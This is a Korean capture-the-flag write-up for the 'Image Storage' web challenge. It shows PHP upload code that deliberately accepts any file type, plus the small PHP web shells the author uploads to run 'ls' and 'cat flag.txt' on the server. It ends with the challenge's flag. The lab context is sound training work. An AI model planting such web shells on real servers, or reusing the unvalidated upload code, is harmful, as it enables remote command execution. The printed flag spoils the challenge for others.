https://honey-push-30b.notion.site/Image-Storage-2bc7d28d73c04096ab48f55f8a1ec811

# 문제 접근

Image-Storage 문제의 접속 정보와 문제 설명 및 문제파일을 다운로드 받을 수 있다. 

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e2554962-7dba-4e23-9338-63cacec45595/_.png)

이번 문제의 경우 php파일 세개(index,list,upload)로 이루어져 있는데 하나씩 살펴보자

# Index.php

```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/>
    <div class="container">
    	<h2>Upload and Share Image !</h2>
    </div> 
</body>
</html>
```

![index.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d8371054-160f-4a94-a4a2-417cfb3ef300/index.png)

그저 /(현재 인덱스 페이지), /list.php, /upload.php로 이동하는 기능 말고는 없다. 

# list.php

```php
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container"><ul>
    <?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
        foreach ($scanned_directory as $key => $value) {
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?> 
    </ul></div> 
</body>
</html>
```

핵심은 이부분이다.    

<?php
        $directory = './uploads/';
        $scanned_directory = array_diff(scandir($directory), array('..', '.', 'index.html'));
        foreach ($scanned_directory as $key => $value) {
            echo "<li><a href='{$directory}{$value}'>".$value."</a></li><br/>";
        }
    ?> 

/uploads/ 디렉토리에서 “..”,”.”,”index.html” 셋을 제외한 다른 파일들을 찾아서 각 파일들의 링크를 걸어준다.

예를들어서 a.txt가 uploads 폴더에 있으면 $scanned_directory에는 a.txt가 있을 것이고 이 값을 value로 삼아서 echo”<li><a href='./uploads/a.txt'>"a.txt"</a></li><br/>” 이 되어버린다.

즉 내가 올린 파일이 php파일 이어도 그 php파일 내용을 볼 수 있다는 것이다. 그럼 php파일을 올릴 수 있는지 uploads.php를 확인하자.

# upload.php

```php
<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```

<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>

부분이 핵심인데 내가 업로드하는 파일에 대한 검증은 이미 존재하는지만 체크한다. 그렇다면 php파일을 업로드하여 그 php파일을 통해 원하는 정보를 얻어낼 수 있다.

# 문제 풀이

일단 업로드한 php파일이 제대로 작동하는지 확인하기 위해서 간단한 php파일을 업로드했다.

```php
<?php
  system("ls")
?>
```

![ex1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/71c03f70-b43c-4554-ae4d-75ce11520677/ex1.png)

![ex1(1).PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f6cf1fc8-bdf5-43cf-ab55-a2982f467b8a/ex1(1).png)

ls 결과 값이 아주 잘 작동하는 것을 볼 수 있다.  그렇다면 이제 디렉토리를 위로 올라가면서 flag.txt를 찾으면 된다.

```php
<?php
  system("cd ../ ;ls")
?>
```

![ex2.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/25ebe046-07be-4b36-abc9-92146aab222f/ex2.png)

```php
<?php
  system("cd ../../ ;ls")
?>
```

![ex3.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/782d262b-65dc-418b-8ea7-08947a799c39/ex3.png)

```php
<?php
  system("cd ../../../ ;ls")
?>
```

![ex4.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/86869017-b0e0-42fa-81d8-71fb3c6d6f90/ex4.png)

```php
<?php
  system("cd ../../../../ ;ls")
?>
```

![ex5.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1ff33066-676e-437a-94a6-1456566c400f/ex5.png)

드디어 flag.txt를 찾았다 그러면 이제 이 경로에서 cat flag.txt를 통해 확인해주면 된다.

```php
<?php
  system("cd ../../../../ ;cat flag.txt")
?>
```

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f86452e0-b3c0-43b9-9890-108e062217dd/flag.png)

DH{c29f44ea17b29d8b76001f32e8997bab} 를 찾았다
